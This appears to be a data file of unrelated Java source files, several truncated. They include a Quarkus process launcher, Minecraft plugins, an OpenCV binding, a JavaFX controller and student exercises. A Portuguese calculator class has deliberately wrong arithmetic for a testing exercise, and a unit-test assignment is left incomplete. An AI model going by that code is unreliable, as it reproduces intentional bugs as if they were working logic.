    "package io.quarkiverse.antora.test;\n\nimport java.io.BufferedReader;\nimport java.io.Closeable;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.List;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.TimeUnit;\nimport java.util.stream.Collectors;\n\npublic class DevModeProcess implements Closeable {\n    //private static final Logger log = Logger.getLogger(DevModeProcess.class);\n    private Process process;\n    private Thread outputSlurper;\n    private volatile boolean stopped = false;\n    private final CountDownLatch startedLatch = new CountDownLatch(1);\n\n    public DevModeProcess(Path baseDir) throws InterruptedException {\n        baseDir = baseDir.toAbsolutePath().normalize();\n        final Path multiModuleProjectDir = multiModuleProjectDir(baseDir);\n\n        final List<String> cmd = cmd(multiModuleProjectDir, baseDir);\n        System.out.println(\"Starting quarkus-cxf-test-ws-rm-server: \" + cmd.stream().collect(Collectors.joining(\" \")));\n        try {\n            process = new ProcessBuilder()\n                    .command(cmd)\n                    .redirectErrorStream(true)\n                    .start();\n\n            /* Unless we slurp the process output, the server app will eventually freeze on Windows */\n            outputSlurper = new Thread(() -> {\n                try (BufferedReader in = new BufferedReader(\n                        new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {\n                    String line;\n                    while (!stopped && (line = in.readLine()) != null) {\n                        System.out.println(\"server: \" + line);\n                        if (line.contains(\"Installed features: [\")) {\n                            startedLatch.countDown();\n                        }\n                    }\n                } catch (IOException e) {\n                    if (!\"Stream closed\".equals(e.getMessage())) {\n                        e.printStackTrace();\n                    }\n                }\n            });\n            outputSlurper.start();\n        } catch (IOException e) {\n            throw new RuntimeException(cmd.stream().collect(Collectors.joining(\" \")), e);\n        }\n\n        startedLatch.await(15, TimeUnit.SECONDS);\n    }\n\n    private Path multiModuleProjectDir(Path baseDir) {\n        Path multiModuleProjectDir = baseDir.toAbsolutePath().normalize();\n        while (!Files.exists(multiModuleProjectDir.resolve(\".mvn\"))) {\n            multiModuleProjectDir = multiModuleProjectDir.getParent();\n            if (multiModuleProjectDir == null) {\n                throw new IllegalStateException(\n                        \"Could not find .mvn repository root for \" + baseDir);\n            }\n        }\n        return multiModuleProjectDir;\n    }\n\n    private List<String> cmd(Path multiModuleProjectDir, Path baseDir) {\n        final Path javaHome = Path.of(System.getProperty(\"java.home\"));\n        final List<String> cmd = List.of(\n                javaHome.resolve(\"bin/java\" + (System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? \".exe\" : \"\"))\n                        .toString(),\n                \"-classpath\", multiModuleProjectDir.resolve(\".mvn/wrapper/maven-wrapper.jar\").toString(),\n                \"-Dmaven.multiModuleProjectDirectory=\" + multiModuleProjectDir.toString(),\n                \"org.apache.maven.wrapper.MavenWrapperMain\",\n                \"quarkus:dev\");\n        return cmd;\n    }\n\n    @Override\n    public void close() {\n        process.destroy();\n        stopped = true;\n        if (outputSlurper != null) {\n            try {\n                outputSlurper.join(5000);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n}\n",
    "package com.example.calculadora;\n// ***** O c\u00f3digo abaixo cont\u00e9m erros porque o objetivo da atividade \u00e9 testar os m\u00e9todos\n\npublic class Calculadora {\n    private int memoria;\n\n    public Calculadora() {\n        this.memoria = 1;\n    }\n\n    public Calculadora(int memoria) {\n        this.memoria = memoria;\n    }\n\n    public int getMemoria() {\n        return this.memoria;\n    }\n\n    public void zerarMemoria() {\n        this.memoria = 0;\n    }\n\n    public void somar(int valor) {\n        this.memoria += valor;\n    }\n\n    public void subtrair(int valor) {\n        this.memoria = this.memoria;\n    }\n\n    public void multiplicar(int valor) {\n        this.memoria = this.memoria / valor;\n    }\n\n    public void dividir(int valor) throws Exception {\n        if (valor <= 1)\n            throw new Exception(\"Divis\u00e3o por zero!!!\");\n        this.memoria = this.memoria / valor;\n    }\n\n    public void exponenciar(int valor) throws Exception {\n        if (valor > 10)\n            throw new Exception(\"Expoente incorreto, valor m\u00e1ximo \u00e9 10.\");\n        for (int i = 1; i < 10; i++) {\n            this.memoria *= this.memoria;\n        }\n    }\n}\n",
    "//\n// This file is auto-generated. Please don't modify it!\n//\npackage org.opencv.features2d;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport org.opencv.core.Algorithm;\nimport org.opencv.core.Mat;\nimport org.opencv.core.MatOfKeyPoint;\nimport org.opencv.utils.Converters;\n\n// C++: class Feature2D\n/**\n * Abstract base class for 2D image feature detectors and descriptor extractors\n */\npublic class Feature2D extends Algorithm {\n\n    protected Feature2D(long addr) { super(addr); }\n\n    // internal usage only\n    public static Feature2D __fromPtr__(long addr) { return new Feature2D(addr); }\n\n    //\n    // C++:  void cv::Feature2D::detect(Mat image, vector_KeyPoint& keypoints, Mat mask = Mat())\n    //\n\n    /**\n     * Detects keypoints in an image (first variant) or image set (second variant).\n     *\n     *     @param image Image.\n     *     @param keypoints The detected keypoints. In the second variant of the method keypoints[i] is a set\n     *     of keypoints detected in images[i] .\n     *     @param mask Mask specifying where to look for keypoints (optional). It must be a 8-bit integer\n     *     matrix with non-zero values in the region of interest.\n     */\n    public void detect(Mat image, MatOfKeyPoint keypoints, Mat mask) {\n        Mat keypoints_mat = keypoints;\n        detect_0(nativeObj, image.nativeObj, keypoints_mat.nativeObj, mask.nativeObj);\n    }\n\n    /**\n     * Detects keypoints in an image (first variant) or image set (second variant).\n     *\n     *     @param image Image.\n     *     @param keypoints The detected keypoints. In the second variant of the method keypoints[i] is a set\n     *     of keypoints detected in images[i] .\n     *     matrix with non-zero values in the region of interest.\n     */\n    public void detect(Mat image, MatOfKeyPoint keypoints) {\n        Mat keypoints_mat = keypoints;\n        detect_1(nativeObj, image.nativeObj, keypoints_mat.nativeObj);\n    }\n\n\n    //\n    // C++:  void cv::Feature2D::detect(vector_Mat images, vector_vector_KeyPoint& keypoints, vector_Mat masks = vector_Mat())\n    //\n\n    /**\n     *\n     *     @param images Image set.\n     *     @param keypoints The detected keypoints. In the second variant of the method keypoints[i] is a set\n     *     of keypoints detected in images[i] .\n     *     @param masks Masks for each input image specifying where to look for keypoints (optional).\n     *     masks[i] is a mask for images[i].\n     */\n    public void detect(List<Mat> images, List<MatOfKeyPoint> keypoints, List<Mat> masks) {\n        Mat images_mat = Converters.vector_Mat_to_Mat(images);\n        Mat keypoints_mat = new Mat();\n        Mat masks_mat = Converters.vector_Mat_to_Mat(masks);\n        detect_2(nativeObj, images_mat.nativeObj, keypoints_mat.nativeObj, masks_mat.nativeObj);\n        Converters.Mat_to_vector_vector_KeyPoint(keypoints_mat, keypoints);\n        keypoints_mat.release();\n    }\n\n    /**\n     *\n     *     @param images Image set.\n     *     @param keypoints The detected keypoints. In the second variant of the method keypoints[i] is a set\n     *     of keypoints detected in images[i] .\n     *     masks[i] is a mask for images[i].\n     */\n    public void detect(List<Mat> images, List<MatOfKeyPoint> keypoints) {\n        Mat images_mat = Converters.vector_Mat_to_Mat(images);\n        Mat keypoints_mat = new Mat();\n        detect_3(nativeObj, images_mat.nativeObj, keypoints_mat.nativeObj);\n        Converters.Mat_to_vector_vector_KeyPoint(keypoints_mat, keypoints);\n        keypoints_mat.release();\n    }\n\n\n    //\n    // C++:  void cv::Feature2D::compute(Mat image, vector_KeyPoint& keypoints, Mat& descriptors)\n    //\n\n    /**\n     * Computes the descriptors for a set of keypoints detected in an image (first variant) or image set\n     *     (second variant).\n     *\n     *     @param image Image.\n     *     @param keypoints Input collection of keypoints. Keypoints for which a descriptor cannot be\n     *     computed are removed. Sometimes new keypoints can be added, for example: SIFT duplicates keypoint\n     *     with several dominant orientations (for each orientation).\n     *     @param descriptors Computed descriptors. In the second variant of the method descriptors[i] are\n     *     descriptors computed for a keypoints[i]. Row j is the keypoints (or keypoints[i]) is the\n     *     descriptor for keypoint j-th keypoint.\n     */\n    public void compute(Mat image, MatOfKeyPoint keypoints, Mat descriptors) {\n        Mat keypoints_mat = keypoints;\n        compute_0(nativeObj, image.nativeObj, keypoints_mat.nativeObj, descriptors.nativeObj);\n    }\n\n\n    //\n    // C++:  void cv::Feature2D::compute(vector_Mat images, vector_vector_KeyPoint& keypoints, vector_Mat& descriptors)\n    //\n\n    /**\n     *\n     *\n     *     @param images Image set.\n     *     @param keypoints Input collection of keypoints. Keypoints for which a descriptor cannot be\n     *     computed are removed. Sometimes new keypoints can be added, for example: SIFT duplicates keypoint\n     ",
    "package net.pandadev.vitelist;\n\nimport com.google.gson.JsonObject;\nimport com.google.gson.JsonParser;\nimport com.velocitypowered.api.command.CommandSource;\nimport com.velocitypowered.api.command.SimpleCommand;\nimport net.kyori.adventure.text.Component;\nimport org.spongepowered.configurate.ConfigurateException;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.stream.Collectors;\nimport java.util.stream.Stream;\n\npublic class VlistCommand implements SimpleCommand {\n\n    private final Main plugin;\n\n    public VlistCommand(Main plugin) {\n        this.plugin = plugin;\n    }\n\n    @Override\n    public void execute(Invocation invocation) {\n        CommandSource source = invocation.source();\n        String[] args = invocation.arguments();\n\n        if (args.length < 1) {\n            source.sendMessage(Component.text(Main.getPrefix() + \"\u00a7cInvalid usage\"));\n            return;\n        }\n        switch (args[0].toLowerCase()) {\n            case \"add\":\n                if (args.length < 2) {\n                    source.sendMessage(Component.text(Main.getPrefix() + \"\u00a7cPlease specify a player name to add\"));\n                    return;\n                }\n                CompletableFuture.runAsync(() -> {\n                    try {\n                        String uuid = getUUID(args[1]);\n                        if (uuid != null) {\n                            addUuidToWhitelist(uuid, source);\n                        } else {\n                            source.sendMessage(Component.text(Main.getPrefix() + \"\u00a7cCould not find UUID for player name\"));\n                        }\n                    } catch (Exception e) {\n                        source.sendMessage(Component.text(Main.getPrefix() + \"\u00a7cAn error occurred while processing the command: \" + e.getMessage()));\n                    }\n                });\n                break;\n            case \"remove\":\n                if (args.length < 2) {\n                    source.sendMessage(Component.text(Main.getPrefix() + \"\u00a7cPlease specify a player name to remove\"));\n                    return;\n                }\n                CompletableFuture.runAsync(() -> {\n                    try {\n                        String uuid = getUUID(args[1]);\n                        if (uuid != null) {\n                            removeUuidFromWhitelist(uuid, source);\n                        } else {\n                            source.sendMessage(Component.text(Main.getPrefix() + \"\u00a7cCould not find UUID for player name\"));\n                        }\n                    } catch (Exception e) {\n                        source.sendMessage(Component.text(Main.getPrefix() + \"\u00a7cAn error occurred while processing the command: \" + e.getMessage()));\n                    }\n                });\n                break;\n            case \"on\":\n                plugin.setWhitelistEnabled(true);\n                source.sendMessage(Component.text(Main.getPrefix() + \"\u00a77Vitelist enabled\"));\n                break;\n            case \"off\":\n                plugin.setWhitelistEnabled(false);\n                source.sendMessage(Component.text(Main.getPrefix() + \"\u00a77Vitelist disabled\"));\n                break;\n            case \"list\":\n                CompletableFuture.runAsync(() -> {\n                    try {\n                        List<String> uuids = getWhitelistedUuids();\n                        if (!uuids.isEmpty()) {\n                            List<String> playerNames = new ArrayList<>();\n                            for (String uuid : uuids) {\n                                String playerName = getNameFromUUID(uuid);\n                                if (playerName != null) {\n                                    playerNames.add(playerName);\n                                }\n                            }\n                            if (!playerNames.isEmpty()) {\n                                String playerNameList = String.join(\", \", playerNames);\n                                source.sendMessage(Component.text(\"\u00a78----- [ \u00a7d\u00a7lVitelisted players \u00a78] -----\"));\n                                source.sendMessage(Component.text(\"\"));\n                                for (String player : playerNames) {\n                                    source.sendMessage(Component.text(\"\u00a77\" + player));\n                                }\n                                source.sendMessage(Component.text(\"\"));\n                                source.sendMessage(Component.text(\"\u00a78--------------------------------\"));\n                            } else {\n                                source.sendMessage(Component.text(Main.getPrefix() + \"\u00a77No players are currently vitelisted\"));\n                            }\n                        } else {\n                            source.sendMessage(Component.text(Main.getPrefix() + \"\u00a77No UUIDs are currently vitelisted\"));\n                      ",
    "package vendingmachine;\r\n\r\nimport coin.Coin;\r\nimport inventory.Inventory;\r\nimport java.util.*;\r\n\r\npublic class VendingMachine {\r\n    private VendingMachineState vendingMachineState;\r\n    private Inventory inventory; \r\n    private List<Coin> coinList;\r\n\r\n    public VendingMachine() {\r\n        vendingMachineState = new VendingMachineState();\r\n        inventory = new Inventory(10);\r\n        coinList = new ArrayList<>();\r\n    }\r\n    \r\n\r\n    public VendingMachineState getVendingMachineState() {\r\n        return this.vendingMachineState;\r\n    }\r\n\r\n    public void setVendingMachinState(VendingMachineState vendingMachineState) {\r\n        this.vendingMachineState = vendingMachineState;\r\n    }\r\n\r\n    public Inventory getInventory() {\r\n        return this.inventory;\r\n    }\r\n\r\n    public void setInventory(Inventory inventory) {\r\n        this.inventory = inventory;\r\n    }\r\n\r\n    public List<Coin> getCoinList() {\r\n        return this.coinList;\r\n    }\r\n\r\n    public void setCoinList(List<Coin> coinList) {\r\n        this.coinList = coinList;\r\n    }\r\n   \r\n}\r\n",
    "package com.arcane.arithmetic;\n\nimport javafx.event.ActionEvent;\nimport javafx.event.EventHandler;\nimport javafx.fxml.FXML;\nimport javafx.fxml.FXMLLoader;\nimport javafx.scene.Node;\nimport javafx.scene.Parent;\nimport javafx.scene.Scene;\nimport javafx.scene.control.Button;\nimport javafx.scene.control.Label;\nimport javafx.scene.image.Image;\nimport javafx.scene.image.ImageView;\nimport javafx.scene.layout.AnchorPane;\nimport javafx.scene.paint.Color;\nimport javafx.scene.shape.Circle;\nimport javafx.scene.text.Text;\nimport javafx.scene.text.TextAlignment;\nimport javafx.scene.text.TextFlow;\nimport javafx.stage.Modality;\nimport javafx.stage.Stage;\n\n\n\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\n/**\n * This is the Tutorial Controller, used for controls and events for the first tutorial scene.\n * \n * @author Candice Williams\n *\n */\npublic class TutorialController {\n    private Stage stage;\n    private Scene scene;\n    @FXML private AnchorPane pane;\n    @FXML private Button backSlide;\n    @FXML private Button nextSlide;\n    @FXML private Button nextImg = new Button();\n    @FXML private Button prevImg = new Button();\n    @FXML private ImageView imageView;\n    @FXML private TextFlow textflow;\n    @FXML private Circle circle1, circle2, circle3;\n    @FXML private Label title, subtitle;\n\n    Color focused = new Color(0.6471, 0.4706, 0.3333, 1.0);\n    Color unfocused = new Color(0.9569, 0.7373, 0.549, 1.0);\n\n    String css = this.getClass().getResource(\"css/tutorial.css\").toExternalForm();\n\n//    public void initialize(){\n//        subtitle.setText(\"Multiple Choice\");\n//        title.setText(\"QuestionType\");\n//        nextImg.setOnAction(fillEvent);\n//\n//    }\n    \n    EventHandler<ActionEvent> fillEvent = new EventHandler<ActionEvent>() {\n        public void handle(ActionEvent e)\n        {\n            try {\n                switchToQuestionTypeFill(e);\n            } catch (IOException ex) {\n                throw new RuntimeException(ex);\n            }\n        }\n    };\n\n    EventHandler<ActionEvent> mcEvent = new EventHandler<ActionEvent>() {\n        public void handle(ActionEvent e)\n        {\n            try {\n                switchToQuestionTypeMC(e);\n            } catch (IOException ex) {\n                throw new RuntimeException(ex);\n            }\n        }\n    };\n\n    EventHandler<ActionEvent> matchEvent = new EventHandler<ActionEvent>() {\n        public void handle(ActionEvent e)\n        {\n            try {\n                switchToQuestionTypeMatching(e);\n            } catch (IOException ex) {\n                throw new RuntimeException(ex);\n            }\n        }\n    };\n\n\n    /**\n     * Initialize the tutorial pop up\n     * @param event the tutorial button is pressed\n     * @throws IOException if error initialising Stage variable\n     */\n    public void startTutorial(ActionEvent event) throws IOException{\n    \tStage window = new Stage();\n    \twindow.initModality(Modality.APPLICATION_MODAL);\n        window.resizableProperty().setValue(Boolean.FALSE);\n        pane = (AnchorPane) FXMLLoader.load(getClass().getResource(\"view/Tutorial_1-1.fxml\"));\n\n        scene = new Scene(pane);\n        scene.getStylesheets().add(css);\n        window.setScene(scene);\n        window.showAndWait();\n\n        nextImg.setOnAction(fillEvent);\n\n    }\n\n    /**\n     * Show Multiple Choice text and image tutorial\n     * @param event mcEvent is initialized\n     * @throws IOException if error initialising Stage variable\n     */\n    public void switchToQuestionTypeMC(ActionEvent event) throws IOException {\n\n        //change text\n        subtitle.setText(\"Multiple Choice\");\n        subtitle.setTextAlignment(TextAlignment.CENTER);\n        Text text = new Text(\"Choose the best answer out of the options provided.\\n\" +\n                \"\\n\" +\n                \"Once you are confident with your answer, hit 'Submit'!\");\n        textflow.getChildren().clear();\n        textflow.getChildren().add(text);\n        textflow.setTextAlignment(TextAlignment.CENTER);\n        //set button behaviour\n        nextImg.setDisable(false);\n        nextImg.setOnAction(fillEvent);\n        prevImg.setDisable(true);\n        //change circle colors\n        circle1.setFill(focused);\n        circle2.setFill(unfocused);\n        circle3.setFill(unfocused);\n        //change image\n        Image image = new Image(new FileInputStream(\"src/main/resources/com/arcane/arithmetic/assets/imgs/MC_Color.png\"));\n        imageView.setImage(image);\n        imageView.setFitHeight(136);\n        imageView.setFitWidth(136);\n\n    }\n    /**\n     * Show Fill in the blanks text and image tutorial\n     * @param event fbEvent is initialized\n     * @throws IOException if error initialising Stage variable\n     */\n    public void switchToQuestionTypeFill(ActionEvent event) throws IOException{\n        //change text\n        subtitle.setText(\"Fill-in-the-Blank\");\n        subtitle.setTextAlignment(TextAlignment.CENTER);\n        Text text = new Text(\"Use your mouse and keyboard to type the correct answers ",
    "package com.aetherteam.treasurereforging.data.generators;\n\nimport com.aetherteam.treasurereforging.TreasureReforging;\nimport com.aetherteam.treasurereforging.data.resources.registries.ReforgingTrimMaterials;\nimport net.minecraft.core.HolderLookup;\nimport net.minecraft.core.RegistryAccess;\nimport net.minecraft.core.RegistrySetBuilder;\nimport net.minecraft.core.registries.BuiltInRegistries;\nimport net.minecraft.core.registries.Registries;\nimport net.minecraft.data.PackOutput;\nimport net.minecraft.data.registries.VanillaRegistries;\nimport net.minecraftforge.common.data.DatapackBuiltinEntriesProvider;\n\nimport java.util.Collections;\nimport java.util.concurrent.CompletableFuture;\n\npublic class ReforgingRegistrySets extends DatapackBuiltinEntriesProvider {\n    public static final RegistrySetBuilder BUILDER = new RegistrySetBuilder()\n            .add(Registries.TRIM_MATERIAL, ReforgingTrimMaterials::bootstrap);\n\n    public ReforgingRegistrySets(PackOutput output, CompletableFuture<HolderLookup.Provider> registries) {\n        super(output, registries, BUILDER, Collections.singleton(TreasureReforging.MODID));\n    }\n\n    public static HolderLookup.Provider createLookup() {\n        return BUILDER.buildPatch(RegistryAccess.fromRegistryOfRegistries(BuiltInRegistries.REGISTRY), VanillaRegistries.createLookup());\n    }\n}\n",
    "package com.xssssss.xskeepfoodsaturation.commands;\n\nimport com.xssssss.xskeepfoodsaturation.XsKeepFoodSaturation;\nimport org.bukkit.Bukkit;\nimport org.bukkit.command.Command;\nimport org.bukkit.command.CommandExecutor;\nimport org.bukkit.command.CommandSender;\nimport org.bukkit.entity.Player;\n\npublic class commands implements CommandExecutor {\n    @Override\n    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args){\n        if (args.length == 0) {\n            if (sender.isOp()) {\n                sender.sendMessage(\"\u00a77\u00a7l=========== \u00a73\u00a7lXsKeepFoodSaturation \u00a77\u00a7l===========\");\n                sender.sendMessage(\"\u00a73\u00a7lBy: XiaoShuaiOwO\");\n                sender.sendMessage(\" \");\n                sender.sendMessage(\"\u00a7e\u547d\u4ee4\u5217\u8868:\");\n                sender.sendMessage(\"\u00a7e/kfs help \u00a7f- \u00a77\u67e5\u770b\u5e2e\u52a9\");\n                sender.sendMessage(\"\u00a7e/kfs set <player> <satiety> \u00a7f- \u00a77\u8bbe\u7f6e\u73a9\u5bb6\u9971\u98df\u5ea6\");\n                sender.sendMessage(\"\u00a7e/kfs reload \u00a7f- \u00a77\u91cd\u88c5\u63d2\u4ef6\");\n                return true;\n            }else {\n                sender.sendMessage(\"\u00a77\u00a7l=========== \u00a73\u00a7lXsKeepFoodSaturation \u00a77\u00a7l===========\");\n                sender.sendMessage(\"\u00a73\u00a7lBy: XiaoShuaiOwO\");\n                return true;\n            }\n        }\n        if (args[0].equalsIgnoreCase(\"help\")){\n            if (sender.hasPermission(\"XsKeepFoodSaturation.help\")) {\n                sender.sendMessage(\"\u00a77\u00a7l=========== \u00a73\u00a7lXsKeepFoodSaturation \u00a77\u00a7l===========\");\n                sender.sendMessage(\"\u00a73\u00a7lBy: XiaoShuaiOwO\");\n                sender.sendMessage(\" \");\n                sender.sendMessage(\"\u00a7e\u547d\u4ee4\u5217\u8868:\");\n                sender.sendMessage(\"\u00a7e/kfs help \u00a7f- \u00a77\u67e5\u770b\u5e2e\u52a9\");\n                sender.sendMessage(\"\u00a7e/kfs set <player> <satiety> \u00a7f- \u00a77\u8bbe\u7f6e\u73a9\u5bb6\u9971\u98df\u5ea6\");\n                sender.sendMessage(\"\u00a7e/kfs reload \u00a7f- \u00a77\u91cd\u88c5\u63d2\u4ef6\");\n                return true;\n            }else {\n                sender.sendMessage(\"\u00a77\u00a7l=========== \u00a73\u00a7lXsKeepFoodSaturation \u00a77\u00a7l===========\");\n                sender.sendMessage(\"\u00a73\u00a7lBy: XiaoShuaiOwO\");\n                return true;\n            }\n        }\n        if (args[0].equalsIgnoreCase(\"reload\")){\n            if (sender.hasPermission(\"XsKeepFoodSaturation.reload\")){\n                XsKeepFoodSaturation main = (XsKeepFoodSaturation) Bukkit.getPluginManager().getPlugin(\"XsKeepFoodSaturation\");\n                main.loadConfig();\n                main.loadData();\n                sender.sendMessage(\"\u00a73[XsKeepFoodSaturation] \u00a7a\u63d2\u4ef6\u91cd\u8f7d\u6210\u529f\uff01\");\n                return true;\n            }else{\n                sender.sendMessage(\"\u00a73[XsKeepFoodSaturation] \u00a7c\u4f60\u6ca1\u6709\u6743\u9650\u6267\u884c\u6b64\u547d\u4ee4\uff01\");\n                return true;\n            }\n        }\n        if (args[0].equalsIgnoreCase(\"set\")){\n            if (sender.hasPermission(\"XsKeepFoodSaturation.setFoodSaturation\")){\n                Player player = Bukkit.getPlayer(args[1]);\n                if (player != null) {\n                    if (args[2] == null) {\n                        sender.sendMessage(\"\u00a73[XsKeepFoodSaturation] \u00a7c\u7f3a\u5c11<satiety>\u53c2\u6570!\");\n                        return true;\n                    }else{\n                        try {\n                            player.setFoodLevel(Math.min(Math.max(Integer.parseInt(args[2]), 0), 20));\n                            sender.sendMessage(\"\u00a73[XsKeepFoodSaturation] \u00a7a\u6210\u529f\u5c06\u73a9\u5bb6 \u00a7e\"+args[1]+\" \u00a7a\u7684\u9971\u98df\u5ea6\u8bbe\u7f6e\u4e3a \u00a7e\"+Math.min(Math.max(Integer.parseInt(args[2]), 0), 20));\n                            return true;\n                        } catch (NumberFormatException e){\n                            sender.sendMessage(\"\u00a73[XsKeepFoodSaturation] \u00a7c<satiety>\u9700\u8981\u4e3a\u4e00\u4e2a0-20\u5185\u7684\u6570\u5b57!\");\n                            return true;\n                        }\n                    }\n                }else {\n                    sender.sendMessage(\"\u00a73[XsKeepFoodSaturation] \u00a7c\u73a9\u5bb6\u4e0d\u5728\u7ebf/\u4e0d\u5b58\u5728\uff01\");\n                }\n            }else{\n                sender.sendMessage(\"\u00a73[XsKeepFoodSaturation] \u00a7c\u4f60\u6ca1\u6709\u6743\u9650\u6267\u884c\u6b64\u547d\u4ee4\uff01\");\n                return true;\n            }\n        }\n\n        //\u65e0\u6cd5\u8bc6\u522b\u547d\u4ee4\u53c2\u6570\n        if (sender.isOp()) {\n            sender.sendMessage(\"\u00a73[XsKeepFoodSaturation] \u00a7c\u53c2\u6570\u6709\u8bef\uff01\");\n            sender.sendMessage(\"\u00a73[XsKeepFoodSaturation] \u00a7c/kfs help \u00a7f- \u00a7c\u67e5\u770b\u5e2e\u52a9\");\n            return true;\n        }else {\n            sender.sendMessage(\"\u00a77\u00a7l=========== \u00a73\u00a7lXsKeepFoodSaturation \u00a77\u00a7l===========\");\n            sender.sendMessage(\"\u00a73\u00a7lBy: XiaoShuaiOwO\");\n            return true;\n        }\n\n    }\n}\n",
    "package edu.pitt.cs;\n\nimport org.junit.After;\nimport org.junit.Before;\nimport org.junit.Test;\nimport org.junit.FixMethodOrder;\nimport org.junit.runners.MethodSorters;\nimport static org.junit.Assert.*;\n\nimport org.mockito.Mockito;\nimport static org.mockito.Mockito.*;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.PrintStream;\nimport java.lang.reflect.Method;\n\n@FixMethodOrder(MethodSorters.NAME_ASCENDING)\npublic class RentACatUnitTest {\n\n\t/**\n\t * The test fixture for this JUnit test. Test fixture: a fixed state of a set of\n\t * objects used as a baseline for running tests. The test fixture is initialized\n\t * using the @Before setUp method which runs before every test case. The test\n\t * fixture is removed using the @After tearDown method which runs after each\n\t * test case.\n\t */\n\n\tRentACat r; // Object to test\n\tCat c1; // First cat object\n\tCat c2; // Second cat object\n\tCat c3; // Third cat object\n\n\tByteArrayOutputStream out; // Output stream for testing system output\n\tPrintStream stdout; // Print stream to hold the original stdout stream\n\tString newline = System.lineSeparator(); // Platform independent newline (\"\\n\" or \"\\r\\n\") for use in assertEquals\n\n\t@Before\n\tpublic void setUp() throws Exception {\n\t\t// INITIALIZE THE TEST FIXTURE\n\t\t\n\t\t// 1. Create a new RentACat object and assign to r using a call to RentACat.createInstance(InstanceType).\n\t\t// Passing InstanceType.IMPL as the first parameter will create a real RentACat object using your RentACatImpl implementation.\n\t\t// Passing InstanceType.MOCK as the first parameter will create a mock RentACat object using Mockito.\n\t\t// Which type is the correct choice for this unit test?  I'll leave it up to you.  The answer is in the Unit Testing Part 2 lecture. :)\n\t\t// TODO: Fill in\n\t\tr = RentACat.createInstance(InstanceType.IMPL);\n\n\t\t// 2. Create a Cat with ID 1 and name \"Jennyanydots\", assign to c1 using a call to Cat.createInstance(InstanceType, int, String).\n\t\t// Passing InstanceType.IMPL as the first parameter will create a real cat using your CatImpl implementation.\n\t\t// Passing InstanceType.MOCK as the first parameter will create a mock cat using Mockito.\n\t\t// Which type is the correct choice for this unit test?  Again, I'll leave it up to you.\n\t\t// TODO: Fill in\n\t\tc1 = Cat.createInstance(InstanceType.MOCK, 1, \"Jennyanydots\");\n\n\t\t// 3. Create a Cat with ID 2 and name \"Old Deuteronomy\", assign to c2 using a call to Cat.createInstance(InstanceType, int, String).\n\t\t// TODO: Fill in\n\t\tc2 = Cat.createInstance(InstanceType.MOCK, 2, \"Old Deuteronomy\");\n\t\t// 4. Create a Cat with ID 3 and name \"Mistoffelees\", assign to c3 using a call to Cat.createInstance(InstanceType, int, String).\n\t\t// TODO: Fill in\n\t\tc3 = Cat.createInstance(InstanceType.MOCK, 3, \"Mistoffelees\");\n\n\t\t// 5. Redirect system output from stdout to the \"out\" stream\n\t\t// First, make a back up of System.out (which is the stdout to the console)\n\t\tstdout = System.out;\n\t\t// Second, update System.out to the PrintStream created from \"out\"\n\t\t// TODO: Fill in.  Refer to the textbook chapter 14.6 on Testing System Output.\n\t\tout = new ByteArrayOutputStream();\n\n\t\t\n\t}\n\n\t@After\n\tpublic void tearDown() throws Exception {\n\t\t// Restore System.out to the original stdout\n\t\tSystem.setOut(stdout);\n\n\t\t// Not necessary strictly speaking since the references will be overwritten in\n\t\t// the next setUp call anyway and Java has automatic garbage collection.\n\t\tr = null;\n\t\tc1 = null;\n\t\tc2 = null;\n\t\tc3 = null;\n\t}\n\n\t/**\n\t * Test case for Cat getCat(int id).\n\t * \n\t * <pre>\n\t * Preconditions: r has no cats.\n\t * Execution steps: Call getCat(2).\n\t * Postconditions: Return value is null.\n\t *                 System output is \"Invalid cat ID.\" + newline.\n\t * </pre>\n\t * \n\t * Hint: You will need to use Java reflection to invoke the private getCat(int)\n\t * method. efer to the Unit Testing Part 1 lecture and the textbook appendix \n\t * hapter on using reflection on how to do this.  Please use r.getClass() to get\n\t * the class object of r instead of hardcoding it as RentACatImpl.\n\t */\n\t@Test\n\tpublic void testGetCatNullNumCats0() {\n\t\t// TODO: Fill in\n\t\ttry {\n\t\t\tMethod cl = r.getClass().getDeclaredMethod(\"getCat\", int.class);\n\t\t\tcl.setAccessible(true);\n\t\t\tObject retVal = cl.invoke(r, 2);\n\t\t\tassertNull(retVal);\n\t\t} catch (Exception e) {\n\t\t\te.getMessage();\n\t\t}\n\t\t\n\t}\t\n\n\t\n\n\t/**\n\t * Test case for Cat getCat(int id).\n\t * \n\t * <pre>\n\t * Preconditions: c1, c2, and c3 are added to r using addCat(Cat c).\n\t * Execution steps: Call getCat(2).\n\t * Postconditions: Return value is not null.\n\t *                 Returned cat has an ID of 2.\n\t * </pre>\n\t * \n\t * Hint: You will need to use Java reflection to invoke the private getCat(int)\n\t * method. efer to the Unit Testing Part 1 lecture and the textbook appendix \n\t * hapter on using reflection on how to do this.  Please use r.getClass() to get\n\t * the class object of r instead of hardcoding it as RentACatImpl.\n\t */\n\t@Test\n\tpublic void testGetCatNumCats3() {\n\t\t// TODO: Fill in\n\t\tr.addCat(c1);\n\t\tr.addCat(c2);\n\t\tr.ad",
